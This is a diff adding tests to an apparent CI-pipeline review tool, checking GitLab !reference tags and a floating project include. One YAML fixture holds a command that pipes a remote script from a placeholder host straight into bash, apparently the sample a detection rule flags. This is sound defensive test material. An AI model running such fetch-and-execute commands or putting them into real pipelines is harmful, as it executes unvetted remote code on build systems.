@@ -158,3 +158,26 @@ def test_cli_exit_codes(tmp_path):
     )
     (tmp_path / "x.yml").write_text("a: 1\n")
     assert runner.invoke(main, ["ci-review", str(tmp_path)]).exit_code == 1
+
+
+def test_gitlab_reference_tag_and_custom_tags_are_accepted(tmp_path):
+    text = """\
+.setup:
+  script:
+    - echo prepare
+build:
+  script:
+    - !reference [.setup, script]
+    - curl -sSL https://example.invalid/i.sh | bash
+deploy:
+  script: !Sub "echo ${Name}"
+"""
+    report = review(tmp_path, text)
+    assert report["summary"]["files"] == 1
+    assert rules_in(report) == {"CI005"}  # the !reference pointer itself is not reviewed as code
+
+
+def test_gitlab_floating_project_include_is_reported_once_with_the_ref(tmp_path):
+    text = "include:\n  - project: 'g/ci'\n    file: '/a.yml'\n    ref: main\nj:\n  script: [x]\n"
+    finding = review(tmp_path, text)["findings"][0]
+    assert finding["rule"] == "CI001" and "main" in finding["detail"] and finding["line"] == 2
